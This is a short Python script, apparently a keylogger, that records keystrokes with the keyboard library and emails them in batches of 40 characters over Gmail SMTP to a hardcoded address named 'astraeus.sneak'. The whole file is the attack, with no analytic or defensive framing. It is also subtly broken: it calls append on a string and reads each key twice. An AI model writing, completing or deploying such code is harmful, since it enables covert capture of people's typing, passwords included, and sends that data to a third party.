import keyboard
import smtplib, ssl

port = 465
password = input("Password: ")
context = ssl.create_default_context()
text = ""
sender_email = "astraeus.sneak@gmail.com"
receiver_email= sender_email

with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    server.login(sender_email, password)
    while True:
        key = keyboard.read_key()
        duplicate_key = keyboard.read_key()
        text.append(key)
        print(key, end='')
        if len(text) >= 40:
            server.sendmail(sender_email, receiver_email, text)
            text = ""
            
